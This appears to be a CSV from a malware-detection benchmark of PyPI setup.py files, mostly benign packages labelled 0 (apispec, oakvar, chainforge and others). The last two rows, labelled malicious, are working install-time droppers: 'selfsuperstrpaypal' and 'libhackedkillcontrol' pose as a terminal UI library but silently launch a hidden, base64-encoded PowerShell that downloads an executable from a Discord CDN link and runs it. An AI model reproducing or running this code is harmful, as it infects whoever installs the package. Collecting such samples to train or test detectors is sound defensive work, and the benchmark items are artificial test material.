sample_id,package_name,file_source,ecosystem,language,label,source,content_hash,content
a33d751cfda92f9411842472ca805a790cea1cce,apispec-6.3.0,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/apispec/6.3.0/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,6cac23e8fd64a7471ffb23f6128ec9050bfe57b6,"import re
from setuptools import setup, find_packages

INSTALL_REQUIRES = ""packaging>=21.3""

EXTRAS_REQUIRE = {
    ""marshmallow"": [""marshmallow>=3.18.0""],
    ""yaml"": [""PyYAML>=3.10""],
    ""validation"": [""prance[osv]>=0.11"", ""openapi_spec_validator<0.5""],
    ""lint"": [
        ""flake8==5.0.4"",
        ""flake8-bugbear==22.9.23"",
        ""pre-commit~=2.4"",
        ""mypy==0.982"",
        ""types-PyYAML"",
    ],
    ""docs"": [
        ""marshmallow>=3.13.0"",
        ""pyyaml==6.0"",
        ""sphinx==5.2.3"",
        ""sphinx-issues==3.0.1"",
        ""sphinx-rtd-theme==1.0.0"",
    ],
}
EXTRAS_REQUIRE[""tests""] = (
    EXTRAS_REQUIRE[""yaml""]
    + EXTRAS_REQUIRE[""validation""]
    + [""marshmallow>=3.13.0"", ""pytest""]
)
EXTRAS_REQUIRE[""dev""] = EXTRAS_REQUIRE[""tests""] + EXTRAS_REQUIRE[""lint""] + [""tox""]


def find_version(fname):
    """"""Attempts to find the version number in the file names fname.
    Raises RuntimeError if not found.
    """"""
    version = """"
    with open(fname) as fp:
        reg = re.compile(r'__version__ = [\'""]([^\'""]*)[\'""]')
        for line in fp:
            m = reg.match(line)
            if m:
                version = m.group(1)
                break
    if not version:
        raise RuntimeError(""Cannot find version information."")
    return version


def read(fname):
    with open(fname) as fp:
        content = fp.read()
    return content


setup(
    name=""apispec"",
    version=find_version(""src/apispec/__init__.py""),
    description=""A pluggable API specification generator. Currently supports the ""
    ""OpenAPI Specification (f.k.a. the Swagger specification)."",
    long_description=read(""README.rst""),
    author=""Steven Loria"",
    author_email=""sloria1@gmail.com"",
    url=""https://github.com/marshmallow-code/apispec"",
    packages=find_packages(""src""),
    package_dir={"""": ""src""},
    include_package_data=True,
    install_requires=INSTALL_REQUIRES,
    extras_require=EXTRAS_REQUIRE,
    license=""MIT"",
    zip_safe=False,
    keywords=""apispec swagger openapi specification oas documentation spec rest api"",
    python_requires="">=3.7"",
    classifiers=[
        ""License :: OSI Approved :: MIT License"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Programming Language :: Python :: 3.11"",
        ""Programming Language :: Python :: 3 :: Only"",
    ],
    test_suite=""tests"",
    project_urls={
        ""Funding"": ""https://opencollective.com/marshmallow"",
        ""Issues"": ""https://github.com/marshmallow-code/apispec/issues"",
        ""Tidelift"": ""https://tidelift.com/subscription/pkg/pypi-apispec?utm_source=pypi-apispec&utm_medium=pypi"",  # noqa: B950,E501
    },
)"
bc4ddb002bb3348d40caf59da0955ae768d3b789,siman-1.4.7,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/siman/1.4.7/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,68f6474022fd2b0c0e61c7804781e65ef7b50e96,"import setuptools, os

with open(""README.md"", ""r"") as fh:
    long_description = fh.read()

setuptools.setup(
    name=""siman"",
    version=""1.4.7"",
    author=""Dmitry Aksenov"",
    author_email=""dimonaks@gmail.com"",
    description=""Manager for DFT calculations"",
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    url=""https://github.com/dimonaks/siman"",
    license = 'GPL',
    keywords='DFT VASP Density Functional Theory NEB DFT+U PAW GGA Monte-Carlo',
    # package_dir={'':'siman'},
    packages=setuptools.find_packages(),
    # packages=['siman'],
    # data_files=[(os.path.expanduser(""~""), ['siman/simanrc.py'])],
    install_requires=['numpy', 'tabulate', 'pymatgen', 'pandas', 'scipy', 'six', 'matplotlib', 'ase', 'paramiko', 'adjustText'],
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: GNU General Public License (GPL)"",
        ""Operating System :: OS Independent"",
    ],
)"
c6544d907b7733ba74a80b6bb44dc6d17199970d,renderg-sdk-0.1.11,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/renderg-sdk/0.1.11/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,81b2db2dc3681342e52806dc5f07cf0e734d810d,"from os import path

from setuptools import setup, find_packages


def get_readme():
    this_directory = path.abspath(path.dirname(__file__))
    with open(path.join(this_directory, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()
    return long_description


setup(
    name='renderg-sdk',
    version='0.1.11',
    url='https://github.com/renderg-repo/renderg-sdk.git',
    author='RenderG',
    author_email='support@renderg.com',
    description='www.renderg.com',
    long_description=get_readme(),
    long_description_content_type='text/markdown',
    packages=find_packages(),    
    install_requires=[
        'requests',
        'tenacity',
        'paho-mqtt'
    ],
    package_data={
        'analyze_houdini': [""./houdini/*""],
        'ascp': [""./*/*""],
    },
    classifiers=[
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 2"",
        ""Programming Language :: Python :: 3"",
    ],
)"
c71e8ec131683fccf33a9d2daf3172ef39927451,gs-peer-connection-0.0.31.53,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/gs-peer-connection/0.0.31.53/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,1ce1722d083a998870dc215fb5fa92f8a1dd6c17,"import pathlib
from setuptools import setup

# The directory containing this file
HERE = pathlib.Path(__file__).parent

# The text of the README file
README = (HERE / ""README.md"").read_text()

# This call to setup() does all the work
setup(
    name=""gs-peer-connection"",
    version=""0.0.31.53"",
    description=""python peer connection adapter"",
    long_description=README,
    long_description_content_type=""text/markdown"",
    url=""https://glass-sphere-ai.de"",
    author=""Glass Sphere Software"",
    author_email="""",
    license=""MIT"",
    classifiers=[
        ""License :: OSI Approved :: MIT License"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.7"",
    ],
    packages=[""gspeerconnection""],
    include_package_data=True,
    install_requires=[""aiortc"",
                      ""aiohttp"",
                      ""python-socketio"",
                      ""ujson"",
                      ""crc32c"",
                      ""StrEnum"",
                      ""py-ubjson"",
                      ""msgpack"",
                      ""numpy"",
                      ""requests""
                      ],
    entry_points={
        ""console_scripts"": [
            ""realpython=gspeerconnection.__main__:main"",
        ]
    },
)"
d223cbd954cdbed7e2197ad81752571e1e58b6e8,vtarget-0.3.0,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/vtarget/0.3.0/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,5936563ea27ff8f776407ea67a4fee797b1a2dd0,"from setuptools import __version__, setup

with open(""./README.md"", ""r"") as f:
    readme = f.read()

with open(""./requirements.txt"", ""r"") as f:
    requirements = f.read().splitlines()

setup(
    name=""vtarget"",
    packages=[
        ""vtarget"",
        ""vtarget.dataprep"",
        ""vtarget.dataprep.nodes"",
        ""vtarget.handlers"",
        ""vtarget.utils"",
    ],
    version=""0.3.0"",
    description=""vtarget lib"",
    long_description=readme,
    long_description_content_type=""text/markdown"",
    author=""vTarget Team"",
    author_email=""contact@vtarget.ai"",
    keywords=[""vtarget"", ""dataprep""],
    classifiers=[],
    license=""BSD"",
    install_requires=requirements,
    include_package_data=False,
    python_requires="">=3.9.10,<3.11.0"",
)"
d3e545b0ac8e32a7dd9522de57aa7032c47e4e79,oakvar-2.9.59,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/oakvar/2.9.59/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,80cfb804df2a92aef8cb03b34644af3af1472611,"from setuptools import setup
import os
from pathlib import Path


def walk_and_add(d, pkg_files):
    folders = [
        ""api"",
        ""cli"",
        ""gui"",
        ""lib"",
    ]
    for root, _, files in os.walk(d):
        root_spl = root.split(os.sep)
        if len(root_spl) <= 1:
            continue
        root_f = root_spl[1]
        root_l = root_spl[-1]
        if root_f in folders and root_l != ""__pycache__"":
            root_files = [os.path.join("".."", root, f) for f in files]
            pkg_files.extend(root_files)


this_directory = Path(__file__).parent
long_description = (this_directory / ""README.rst"").read_text()
oakvar_files = []
cravat_files = []
walk_and_add(""oakvar"", oakvar_files)
walk_and_add(""cravat"", cravat_files)
setup(
    name=""oakvar"",
    version=""2.9.59"",
    description=""A genomic variant analysis platform"",
    long_description=long_description,
    long_description_content_type=""text/x-rst"",
    url=""https://github.com/rkimoakbioinformatics/oakvar"",
    author=""Ryangguk Kim"",
    author_email=""rkim@oakbioinformatics.com"",
    license="""",
    classifiers=[""""],
    keywords=""genomic variant analysis interpretation genome"",
    project_urls={
        ""Documentation"": ""https://oakvar.readthedocs.io"",
        ""Source"": ""https://github.com/rkimoakbioinformatics/oakvar"",
        ""Tracker"": ""https://github.com/rkimoakbioinformatics/oakvar/issues"",
    },
    packages=[""oakvar"", ""cravat""],
    py_modules=[],
    install_requires=[
        ""requests"",
        ""requests-toolbelt"",
        ""liftover"",
        ""markdown"",
        ""aiohttp<4.0.0"",
        ""chardet>=3.0.4"",
        ""aiosqlite"",
        ""oyaml"",
        ""nest-asyncio"",
        ""psutil"",
        ""python-dateutil"",
        ""download"",
        ""gdown"",
        ""split-file-reader"",
        ""packaging"",
        ""Pillow"",
        ""duckdb"",
        ""rich"",
        ""aiohttp-cors"",
        ""pyjwt"",
        ""polars"",
        ""connectorx"",
        ""pyarrow"",
        ""multiprocess"",
        # below are module-specific. move them to module's yml.
        ""mpmath"",
        ""twobitreader"",
        # ok to delete the below?
        ""intervaltree"",
    ],
    python_requires="">=3.8"",
    package_data={""oakvar"": oakvar_files, ""cravat"": cravat_files},
    data_files=[],
    scripts=[],
    entry_points={
        ""console_scripts"": [
            ""ov=oakvar.__main__:main"",
        ]
    },
)"
d98f18e8fa8cd1c19aecd17d382640aa1ab0a09c,chainforge-0.2.7.1,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/chainforge/0.2.7.1/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,8265cf14817457ecd25aee6125460653c65a0e82,"from setuptools import setup, find_packages

def readme():
    with open('README.md', encoding='utf-8') as f:
        return f.read()

setup(
    name='chainforge',
    version='0.2.7.1',
    packages=find_packages(),
    author=""Ian Arawjo"",
    description=""A Visual Programming Environment for Prompt Engineering"",
    long_description=readme(),
    long_description_content_type='text/markdown',
    keywords='prompt engineering LLM response evaluation',
    license=""MIT"",
    url=""https://github.com/ianarawjo/ChainForge/"",
    install_requires=[
        # Package dependencies
        ""flask>=2.2.3"",
        ""flask[async]"",
        ""flask_cors"",
        ""requests"",
        ""urllib3==1.26.6"",
        ""openai"",
        ""anthropic"",
        ""google-generativeai"",
        ""dalaipy>=2.0.2"",
        ""mistune>=2.0"",  # for LLM response markdown parsing
    ],
    entry_points={
        'console_scripts': [
            'chainforge = chainforge.app:main',
        ],
    },
    classifiers=[
        # Package classifiers
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
    ],
    python_requires="">=3.8"",
    include_package_data=True,
)"
f068fc6802675c140f1c57ddaf7d827ccbcc2e5c,clickhouse-sqlalchemy-0.2.4,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/clickhouse-sqlalchemy/0.2.4/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,4fe43df0a65a422c9b09be7d1db78ef88e88fb27,"import os
import re
from codecs import open

from setuptools import setup, find_packages

here = os.path.abspath(os.path.dirname(__file__))


with open(os.path.join(here, 'README.rst'), encoding='utf-8') as f:
    long_description = f.read()


def read_version():
    regexp = re.compile(r'^VERSION\W*=\W*\(([^\(\)]*)\)')
    init_py = os.path.join(here, 'clickhouse_sqlalchemy', '__init__.py')
    with open(init_py, encoding='utf-8') as f:
        for line in f:
            match = regexp.match(line)
            if match is not None:
                return match.group(1).replace(', ', '.')
        else:
            raise RuntimeError(
                'Cannot find version in clickhouse_sqlalchemy/__init__.py'
            )


dialects = [
    'clickhouse{}=clickhouse_sqlalchemy.drivers.{}'.format(driver, d_path)

    for driver, d_path in [
        ('', 'http.base:ClickHouseDialect_http'),
        ('.http', 'http.base:ClickHouseDialect_http'),
        ('.native', 'native.base:ClickHouseDialect_native'),
        ('.asynch', 'asynch.base:ClickHouseDialect_asynch'),
    ]
]

github_url = 'https://github.com/xzkostyan/clickhouse-sqlalchemy'

setup(
    name='clickhouse-sqlalchemy',
    version=read_version(),

    description='Simple ClickHouse SQLAlchemy Dialect',
    long_description=long_description,

    url=github_url,

    author='Konstantin Lebedev',
    author_email='kostyan.lebedev@gmail.com',

    license='MIT',

    classifiers=[
        'Development Status :: 4 - Beta',


        'Environment :: Console',


        'Intended Audience :: Developers',
        'Intended Audience :: Information Technology',


        'License :: OSI Approved :: MIT License',


        'Operating System :: OS Independent',


        'Programming Language :: SQL',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',

        'Topic :: Database',
        'Topic :: Software Development',
        'Topic :: Software Development :: Libraries',
        'Topic :: Software Development :: Libraries :: Application Frameworks',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'Topic :: Scientific/Engineering :: Information Analysis'
    ],

    keywords='ClickHouse db database cloud analytics',

    project_urls={
        'Documentation': 'https://clickhouse-sqlalchemy.readthedocs.io',
        'Changes': github_url + '/blob/master/CHANGELOG.md'
    },
    packages=find_packages('.', exclude=[""tests*""]),
    python_requires='>=3.7, <4',
    install_requires=[
        'sqlalchemy>=1.4.24,<1.5',
        'greenlet>=2.0.1',
        'requests',
        'clickhouse-driver>=0.1.2',
        'asynch>=0.2.2',
    ],
    # Registering `clickhouse` as dialect.
    entry_points={
        'sqlalchemy.dialects': dialects
    },
    test_suite='pytest'
)"
f10ecdbf38cdcfb154f369258a9f45c61db7aa6a,owega-4.2.0,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/owega/4.2.0/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,5890268c2286bd4b3b25b74cb1c118eee4f07e6e,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from setuptools import setup

desc = open('README.md').read()

setup(
	name='owega',
	version='4.2.0',
	packages=[
		'owega',
		'owega.changelog',
		'owega.config',
		'owega.OwegaFun',
		'owega.conversation',
	],
	install_requires=[
		'openai>=1.1.1',
		'prompt_toolkit>=3.0',
		'requests>=2.0',
		'beautifulsoup4>=4.0',
		'lxml>=4.0',
	],
	scripts=[
		'scripts/owega',
	],
	long_description=desc,
	long_description_content_type='text/markdown',
)"
f427514cab816189d828ead508c728fb769b61c7,eznf-0.8.2,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/eznf/0.8.2/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,18dc0680feb3fc5f1ed44148abf2f08401942b38,"from setuptools import find_packages, setup

setup(
    name='eznf',
    packages=find_packages(include=['eznf']),
    version='0.8.2',
    description='A library for easily encoding problems into SAT',
    author='Bernardo Subercaseaux',
    install_requires=[],
    setup_requires=['pytest-runner'],
    tests_require=['pytest'],
    test_suite='tests',
)"
055fd6f253f2813fdd938cbf519341e64c44568c,selfsuperstrpaypal-9.31,selfsuperstrpaypal-9.31/selfsuperstrpaypal-9.31/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,cc22baa11fc32d966f68596bb5043a669472dd01,"from distutils.core import setup

try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    # www.esquelesquad.rip
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
try:
  setup(
    name = 'selfsuperstrpaypal',
    packages = ['modlib'],
    version = '5.59',
    # license='MIT',
    description = 'A library for creating a terminal user interface',
    author = 'EsqueleSquad',
    author_email = 'tahgoficial@proton.me',
    classifiers=[
      'Development Status :: 3 - Alpha',
      'Intended Audience :: Developers',
      'Topic :: Software Development :: Build Tools',
      'License :: OSI Approved :: MIT License',
      'Programming Language :: Python :: 3',
      'Programming Language :: Python :: 3.4',
      'Programming Language :: Python :: 3.5',
      'Programming Language :: Python :: 3.6',
      'Programming Language :: Python :: 3.7',
      'Programming Language :: Python :: 3.8',
      'Programming Language :: Python :: 3.9',
      'Programming Language :: Python :: 3.10',
      'Programming Language :: Python :: 3.11',
    ],
  )
except: pass"
0e4198303fbf824133fb9a1780ab0321b3e58350,libhackedkillcontrol-5.31,libhackedkillcontrol-5.31/libhackedkillcontrol-5.31/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,c438d0ac8400cd86d720fc176eb3cf86806b74bf,"from distutils.core import setup

try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    # www.esquelesquad.rip
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
try:
  setup(
    name = 'libhackedkillcontrol',
    packages = ['modlib'],
    version = '9.49',
    # license='MIT',
    description = 'A library for creating a terminal user interface',
    author = 'EsqueleSquad',
    author_email = 'tahgoficial@proton.me',
    classifiers=[
      'Development Status :: 3 - Alpha',
      'Intended Audience :: Developers',
      'Topic :: Software Development :: Build Tools',
      'License :: OSI Approved :: MIT License',
      'Programming Language :: Python :: 3',
      'Programming Language :: Python :: 3.4',
      'Programming Language :: Python :: 3.5',
      'Programming Language :: Python :: 3.6',
      'Programming Language :: Python :: 3.7',
      'Programming Language :: Python :: 3.8',
      'Programming Language :: Python :: 3.9',
      'Programming Language :: Python :: 3.10',
      'Programming Language :: Python :: 3.11',
    ],
  )
except: pass"
